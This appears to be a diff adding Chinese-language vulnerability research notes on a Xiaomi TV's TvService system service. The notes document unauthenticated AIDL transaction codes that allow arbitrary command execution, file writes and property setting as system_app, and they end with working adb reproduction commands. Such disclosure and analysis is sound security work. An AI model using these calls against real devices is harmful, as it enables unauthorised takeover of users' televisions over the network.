@@ -1,0 +1,57 @@
+################ TvService (mitv.internal.ITvService) AIDL 事务码勘定 ################
+设备: 小米电视 ES65 2022 (baymax, MStar MT5872, Android 10 / SDK 29)
+TvService 进程: android.uid.system (sharedUserId), 域 u:r:system_app:s0
+TvService 类:  mitv.service.TvService
+   实现类:    mitv.internal.TvServiceDefaultImpl extends ITvService.Stub
+日志 TAG:    MiTv-Service-TvService-Parent
+
+### 存在性 oracle ###
+$ adb shell 'service call TvService 99999'
+Result: Parcel(
+  0x00000000: ffffffff 00000017 004e006f 00200074 '........N.o.t. .t.'
+  ...)  ==> "Not a data message"     <== 事务码不存在
+存在的事务码会返回真实 Parcel / 抛业务异常 / 打 logcat。
+
+### 副作用 oracle（三路同时扫） ###
+a) service call TvService <N> s16 "probe.p<N>" s16 "VAL<N>"     -> 查 getprop 是否有 probe.p<N>
+b) service call TvService <N> s16 "setprop probe.c<N> 1"        -> 查 getprop 是否有 probe.c<N>
+c) service call TvService <N> s16 "/sdcard/probe_w<N>" s16 "MARKER" -> 查 /sdcard/probe_w<N>
+
+a) 命中 130 个  (probe.p1 .. probe.p130)        ==> code 1 = systemPropertiesSet
+c) 命中 1 个    (/sdcard/probe_w2, 内容 MARKER) ==> code 2 = writeSystemFile
+b) 命中 1 个    (probe.c3=1)                    ==> code 3 = runSystemCommand
+
+### logcat 证据 ###
+ITvService$Stub: onTransact code=1   -> systemPropertiesSet(String,String)
+ITvService$Stub: onTransact code=2   -> writeSystemFile(String path, String content)
+ITvService$Stub: onTransact code=3   -> runSystemCommand(String cmd)
+smali 位置: ITvService$Stub.onTransact  468 / 764 / 799 / 1349
+类声明:     TvServiceDefaultImpl extends ITvService.Stub  (末端 super.onTransact 兜底)
+
+### 危险源码位置（jadx 反编译 TvService.apk） ###
+sources/mitv/internal/TvServiceDefaultImpl.java
+  :1178  Runtime.getRuntime().exec(str)       <-- runSystemCommand
+  :1192  SystemProperties.set(str, str2)      <-- systemPropertiesSet
+  ~:1020-1130  文件写入实现                    <-- writeSystemFile
+
+### 事务码区间观测 ###
+1 .. ~81   合法 AIDL 方法
+~82        TvService 进程崩溃（init 自动重启）
+4400       非 AIDL，裸 transact -> vendor.misysdiagnose.cmd.code 属性（uid0 执行）
+
+### 无任何调用方鉴权 ###
+grep -c 'enforceCallingUid\|checkCallingPermission\|enforceCallingPermission' \
+     TvServiceDefaultImpl.java   ==> 0
+==> adb shell / 局域网内任意能连 adb 的主机均可直接调用
+
+### 复现命令 ###
+# 枚举合法事务码
+adb shell 'for i in $(seq 1 300); do r=$(service call TvService $i 2>&1); \
+  case "$r" in *"Not a data message"*) ;; *) echo "EXIST $i -> $r";; esac; done'
+
+# system_app 命令执行
+adb shell 'service call TvService 3 s16 "id"'
+# system_app 任意文件写
+adb shell 'service call TvService 2 s16 "/data/local/tmp/x" s16 "hello"'
+# system_app 写属性
+adb shell 'service call TvService 1 s16 "persist.foo" s16 "bar"'
